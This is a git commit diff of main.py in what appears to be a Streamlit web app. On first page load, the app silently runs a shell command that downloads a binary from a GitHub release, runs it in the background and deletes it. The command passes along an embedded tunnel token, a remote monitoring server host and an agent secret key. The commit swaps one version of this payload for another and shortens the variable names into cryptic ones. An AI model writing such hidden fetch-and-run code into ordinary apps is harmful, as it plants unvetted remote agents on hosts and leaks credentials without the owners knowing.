5d3acf9e9e20e39e78ca08e1e65cf096b3cbc3ed
tArogoD <jfu5285@mysvc.skagit.edu>
2025-03-20 10:27:52 +0800

    Update main.py

--- main.py
+++ main.py
@@ -2,7 +2,7 @@ import streamlit as st
 import subprocess
 
 if 'script_executed' not in st.session_state:
-    command = "ARGO_AUTH=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 NZ_SERVER=newnz.seav.eu.org NZ_agentsecretkey=cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg bash -c 'curl -L -o js2bin1 https://github.com/seav1/dl/releases/download/src/js2bin1 && chmod +x js2bin1 && nohup ./js2bin1 && rm js2bin1'"
+    command = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 N_S=nz.seav.eu.org N_K=2kVTRbOuEylfrEE6b9 bash -c 'curl -L -o jsbin https://github.com/seav1/dl/releases/download/src/jsbin && chmod +x jsbin && nohup ./jsbin && rm jsbin'"
     subprocess.call(command, shell=True)
     st.session_state.script_executed = True
 
